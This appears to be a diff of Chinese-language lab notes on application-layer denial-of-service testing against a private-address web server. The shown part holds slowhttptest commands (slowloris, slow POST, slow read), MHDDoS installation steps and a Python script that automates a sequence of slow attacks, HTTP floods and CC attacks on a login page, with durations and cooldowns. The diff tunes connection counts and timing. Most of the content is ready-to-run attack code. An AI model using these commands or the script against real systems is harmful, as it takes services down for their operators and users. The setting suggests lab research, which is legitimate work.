@@ -520,14 +520,15 @@ if __name__ == "__main__":
 4. slow read(慢速读取)：接收响应非常慢，强迫服务器将数据缓存在内核中。(13:50~13:52)
      slowhttptest -c 1000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -u http://172.31.132.2:8080/
 
-## 5.2 MHDoS
-## 5.2.1 安装
+## 5.2 MHDDoS
+## 5.2.1 安装python环境以及mhddos工具
 CC 攻击利用的是 HTTP 协议，模拟真实用户的浏览行为，这里选择MHDoS
 ```BASH
 cd MHDDoS
 git clone https://github.com/MatrixTM/MHDDoS.git
-python3 -m venv mhddos
-source mhddos/bin/activate
+sudo apt update
+sudo apt install python3.10 python3.10-venv -y
+source venv/bin/activate
 pip install -r requirements.txt
 python3 start.py
 ```
@@ -543,7 +544,7 @@ python3 start.py POST http://172.31.132.2:8080/ 5 1500 empty.txt 50 300(14:02~14
 ```
 
 # 六、慢速攻击和L7自动化攻击脚本
-## 6.1 脚本
+## 6.1 自动化攻击脚本
 自动化攻击脚本👇（先进入`/MHDDoS`）
 ```PYTHON
 import subprocess
@@ -553,7 +554,7 @@ from datetime import datetime, timedelta
 
 # 1. 配置信息
 TARGET_URL = "http://172.31.132.2:8080/login.php"
-COOLDOWN_TIME = 60  # 冷却时间，确保服务器连接完全释放
+COOLDOWN_TIME = 60 # 冷却时间，确保服务器连接完全释放
 
 # --- 路径自动校准 ---
 MHDDOS_PATH = "/root/sec/attacker/MHDDoS"
@@ -577,11 +578,11 @@ if not VENV_PYTHON:
 
 # 2. 任务清单 (格式: 任务名, 工具, 命令, 预计运行秒数)
 # 定义代理文件的绝对路径
-PROXY_FILE = os.path.join(MHDDOS_PATH, "files/proxies/empty.txt") #
+PROXY_FILE = os.path.join(MHDDOS_PATH, "files/proxies/empty.txt")
 tasks = [
-    ("慢速攻击slowloris", "slowhttptest", f"slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u {TARGET_URL} -x 24 -p 3", 240),
-    ("慢速攻击slow post", "slowhttptest", f"slowhttptest -c 1000 -B -i 10 -r 200 -s 8192 -t POST -u {TARGET_URL} -x 10 -p 3", 240),
-    ("慢速攻击slow read", "slowhttptest", f"slowhttptest -c 1000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -u {TARGET_URL}", 240),
+    ("慢速攻击slowloris", "slowhttptest", f"slowhttptest -c 500 -H -i 10 -r 50 -t GET -u {TARGET_URL} -x 24 -p 3", 240),
+    ("慢速攻击slow post", "slowhttptest", f"slowhttptest -c 500 -B -i 10 -r 50 -s 8192 -t POST -u {TARGET_URL} -x 10 -p 3", 240),
+    ("慢速攻击slow read", "slowhttptest", f"slowhttptest -c 500 -X -r 50 -w 512 -y 1024 -n 5 -z 32 -u {TARGET_URL}", 240),
     ("慢速攻击", "MHDDoS", f"{VENV_PYTHON} {MHDDOS_PATH}/start.py SLOW {TARGET_URL} 5 500 {PROXY_FILE} 10 300", 300),
     ("HTTP Flood", "MHDDoS", f"{VENV_PYTHON} {MHDDOS_PATH}/start.py GET {TARGET_URL} 5 2000 {PROXY_FILE} 100 300", 300),
     ("CC攻击", "MHDDoS", f"{VENV_PYTHON} {MHDDOS_PATH}/start.py POST {TARGET_URL} 5 1500 {PROXY_FILE} 50 300", 300)
@@ -611,17 +612,29 @@ def run_research():
         print(f"⏱️ 预计此项结束时间: {task_eta.strftime('%H:%M:%S')}")
 
         try:
-            # 去掉 check=True，改为 check=False
-            # 这样即使 MHDDoS 返回 1，脚本也会认为它运行结束了，继续往下走
+            # 执行攻击指令
             result = subprocess.run(cmd, shell=True, check=False, cwd=MHDDOS_PATH, capture_output=False)
 
-            # 记录为成功，因为我们知道它运行够了时间
+            # --- 等待逻辑 ---
+            # 计算工具实际运行了多久
+            actual_duration = (datetime.now() - start_t_obj).total_seconds()
+
+            # 如果工具意外早退，sleep 补齐剩余的时间
+            if actual_duration < duration:
+                wait_time = duration - actual_duration
+                print(f"⚠️ 工具提前退出，等待补齐剩余时间: {wait_time:.0f} 秒...")
+                time.sleep(wait_time)
+
             end_t_str = datetime.now().strftime("%H:%M")
             results.append({"type": name, "tool": tool, "time": f"{start_t_str}~{end_t_str}"})
             print(f"✅ 攻击任务已完成（程序退出码: {result.returncode}）")
 
+            # --- 冷却逻辑 ---
+            if i < len(tasks):
+                print(f"❄️ 进入冷却期，等待 {COOLDOWN_TIME} 秒后执行下一任务...")
+                time.sleep(COOLDOWN_TIME)
+
         except Exception as e:
-            # 只有脚本自己崩了（比如找不到 Python 解释器）才会走这里
             print(f"❌ 脚本逻辑触发异常: {e}")
 
     # --- 生成报告 ---
@@ -650,3 +663,5 @@ if __name__ == "__main__":
 **改进思路**
 1. 绕过302重定向：`TARGET_URL = "http://172.31.132.2:8080/login.php"`，直接攻击`login.php`
 2. 脚本中的`subprocess.run(..., check=False, shell=True)`修改为`subprocess.run(cmd, shell=True, check=False, cwd=MHDDOS_PATH, capture_output=False)`
+
+## 6.3 7层攻击
